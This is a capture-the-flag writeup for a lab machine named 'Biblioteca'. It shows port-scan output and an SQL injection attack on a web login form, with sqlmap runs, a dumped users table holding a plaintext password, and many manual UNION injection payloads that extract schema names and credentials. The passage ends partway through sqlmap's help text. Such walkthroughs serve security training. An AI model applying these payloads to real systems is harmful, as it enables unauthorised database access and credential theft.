---
Shhh. Be very very quiet, no shouting inside the biblioteca.
---

# Biblioteca — Writeup

## Overview
### Biblioteca — Writeup
### Biblioteca — Writeup
![](https://i.postimg.cc/0N8fPR3k/Webp-net-resizeimage.jpg)

## Privilege Escalation
Start Machine
Hit 'em with the classics.
Answer the questions below
```text
┌──(kali㉿kali)-[~/nappy]
└─$ rustscan -a 10.10.232.50 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.232.50:22
Open 10.10.232.50:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 17:43 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:43
Completed Parallel DNS resolution of 1 host. at 17:43, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:43
Scanning 10.10.232.50 [2 ports]
Discovered open port 22/tcp on 10.10.232.50
Discovered open port 8000/tcp on 10.10.232.50
Completed Connect Scan at 17:43, 0.21s elapsed (2 total ports)
Initiating Service scan at 17:43
Scanning 2 services on 10.10.232.50
Completed Service scan at 17:43, 6.94s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.232.50.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 6.25s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.82s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Nmap scan report for 10.10.232.50
Host is up, received user-set (0.20s latency).
Scanned at 2023-01-10 17:43:45 EST for 14s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 000bf9bf1d49a6c3fa9c5e08d16d8202 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjGXxdFr0mHKml76YqbA09iT/zirMlq63GKdZVLK3ey11u+RmZEpu+4kDoSpTomeHq5PzD2tOvC3xCmfe+r0yJuG+052rgshOHGP5Jsh49ZuOsCNBmf9d5nYQERArUohS+XWk5AzcOAvENMPrN52qZvnZAPBJUR2M3LUtxLeCXd/Pn47rnolC8kSoZnReUHuyDSK6V0KDsgz9gZfsZEasEVFWeQHSeX70stnpRIPEgB523+EjG9VbeBhSVXOaX99RvkwA2EKdX95fAllkmXIwfscKCDcvCKBx2b/64dA2E0tiXx6TTN1rpY47NB1LTHFyEzXhdY04xI4YWGR0OdlHiF22qTxZ40WNQSP1dfazgpEzXm6tpGD7dE9Ko+fgAy+6wCWOuw2rQVefv/hheU8idtl8S+A4LC9NupPmDFf28GVpMFkMry2/yjD7e8Z1Vl3ZBp/BO0IVUnm/fFrGBEJ2e0RJEzI0lWXbytFNZkCLAZt+8IQLsvPep80zxKM9Jlps=
|   256 a10c8e5df07fa532b2eb2f7abfedbf3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBk6WcGKOLXNfFSm4hmo/IJAB/aFJ8ZihzQUm796VuMqs4aIusn5+Lu0C8pv8XB22fwBS8XuB6l9LjTo10CFmoQ=
|   256 9eefc90afce99eede32db130b65fd40b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsjiudT4XOiE2akDRkCkDkhVRMB7oIVMpgkeM63BmO
8000/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title:  Login 
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds

http://10.10.232.50:8000/

login page

Hi smokey!!</br></br> Welcome to the index page...

sqli (' or 1=1-- j)

let's use sqlmap (easy way)
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ sqlmap -u http://10.10.232.50:8000/ --forms --dump
        ___
       __H__                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.12#stable}                                                                                                 
|_ -| . [']     | .'| . |                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:49:16 /2023-01-10/

[17:49:16] [INFO] testing connection to the target URL
[17:49:16] [INFO] searching for forms
[1/1] Form:
POST http://10.10.232.50:8000/login
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] Y
[17:49:37] [INFO] using '/home/kali/.local/share/sqlmap/output/results-01102023_0549pm.csv' as the CSV results file in multiple targets mode
[17:49:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:49:37] [INFO] testing if the target URL content is stable
[17:49:37] [INFO] target URL content is stable
[17:49:37] [INFO] testing if POST parameter 'username' is dynamic
[17:49:38] [WARNING] POST parameter 'username' does not appear to be dynamic
[17:49:38] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[17:49:38] [INFO] testing for SQL injection on POST parameter 'username'
[17:49:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:49:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:49:41] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:49:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:49:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:49:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:49:46] [INFO] testing 'Generic inline queries'
[17:49:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:49:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:49:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:49:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:50:00] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:50:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:50:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:50:35] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:50:36] [INFO] target URL appears to have 4 columns in query
[17:50:37] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=WiRV' AND (SELECT 8066 FROM (SELECT(SLEEP(5)))REjA) AND 'QLRG'='QLRG&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=WiRV' UNION ALL SELECT NULL,CONCAT(0x717a6b7a71,0x46687666675a747166796863426f4e516344426b57504453544d554d526f536f4f42577047464c59,0x7171627871),NULL,NULL-- -&password=
---
do you want to exploit this SQL injection? [Y/n] Y
[17:50:55] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[17:50:56] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[17:50:56] [INFO] fetching current database
[17:50:56] [INFO] fetching tables for database: 'website'
[17:50:57] [INFO] fetching columns for table 'users' in database 'website'
[17:50:57] [INFO] fetching entries for table 'users' in database 'website'
Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+

[17:50:57] [INFO] table 'website.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.232.50/dump/website/users.csv'
[17:50:57] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 26 times
[17:50:57] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-01102023_0549pm.csv'                                                                                                                 

[*] ending @ 17:50:57 /2023-01-10/

now using burpsuite (save item to use with sqlmap later like sql.txt or another name)

send to repeater (response render to see output)

testing (first way)

username='+or+1=1-- -&password=witty (hi smokey)
username='+or+1=1#&password=witty (hi smokey)

SQL injection UNION attack, determining the number of columns returned by the query
username='+UNION+SELECT+NULL,NULL#&password=witty (internal error server so more colums)
username='+UNION+SELECT+NULL,NULL,NULL,NULL#&password=witty (Hi None! so there are 4 cols)

SQL injection UNION attack, finding a column containing text
username='+UNION+SELECT+NULL,'witty',NULL,NULL#&password=witty (Hi witty!)

SQL injection attack, querying the database type and version on MySQL and Microsoft
username='+UNION+SELECT+NULL,@@version,NULL,NULL#&password=witty (8.0.28 Ubuntu...)

username='+UNION+SELECT+NULL,database(),NULL,NULL#&password=witty
Hi website!!

username='+UNION+SELECT+NULL,table_name,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema='website'#&password=witty
Hi users!!

username='+UNION+SELECT+NULL,column_name,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'#&password=witty
Hi id!!

username='+UNION+SELECT+NULL,group_concat(column_name),NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'#&password=witty
Hi id,username,password,email!!

username='+UNION+SELECT+NULL,group_concat(username),NULL,NULL+FROM+users#&password=witty
Hi smokey!!

username='+UNION+SELECT+NULL,group_concat(password),NULL,NULL+FROM+users+WHERE+username='smokey'#&password=witty
Hi My_P@ssW0rd123!!

or

username='+union+select+null,group_concat(username,':',password),null,null+from+users--+&password=witty
Hi smokey:My_P@ssW0rd123!!

second way (in less steps)

username='+union+select+1,2,3,4--+&password=witty
Hi 2!!

username='+union+select+1,(select+group_concat(schema_name,"\r\n")+from+information_schema.schemata),3,4--+&password=witty
Hi information_schema
,website

username='+union+select+1,(select+group_concat(table_name,":",column_name,"\r\n")+from+information_schema.columns+where+table_schema='website'),3,4--+&password=witty
Hi users:id
,users:username
,users:password
,users:email

username='+union+select+1,(select+group_concat(username,":",password,"\r\n")+from+website.users),3,4--+&password=witty
Hi smokey:My_P@ssW0rd123

now sqlmap (step by step)
```
```text
┌──(kali㉿kali)-[~/nappy]
└─$ sqlmap -h                                         
        ___
       __H__                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.12#stable}                                                                                                 
|_ -| . [']     | .'| . |                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                              

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --dbs               Enumerate DBMS databases
